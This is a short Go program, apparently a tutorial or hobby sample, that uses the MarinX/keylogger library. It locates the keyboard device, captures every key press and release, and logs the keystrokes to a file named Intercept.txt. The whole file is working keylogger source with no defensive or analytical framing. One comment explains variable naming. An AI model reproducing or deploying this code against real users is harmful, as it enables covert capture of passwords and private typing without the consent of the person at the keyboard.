package main

import (
	"fmt"
	"os"

	"github.com/MarinX/keylogger"
)

func main() {
	keyboard := keylogger.FindKeyboardDevice()

	if len(keyboard) <= 0 {
		fmt.Fprintln(os.Stderr, "No keyboard found")
		return
	}

	// Look carefully in the below code: keyLogger (with a capital L) is the object
	// keylogger (all lowercase) is the package

	keyLogger, err := keylogger.New(keyboard)
	if err != nil {
		panic(err)
	}
	defer keyLogger.Close()

	f, err := os.Create("Intercept.txt")
	if err != nil {
		panic(err)
	}
	defer f.Close()

	events := keyLogger.Read()

	for e := range events {
		switch e.Type {
		case keylogger.EvKey:
			if e.KeyPress() {
				f.WriteString("↓")
			} else if e.KeyRelease() {
				f.WriteString("↑")
			}
			f.WriteString(e.KeyString())
		}
	}
}
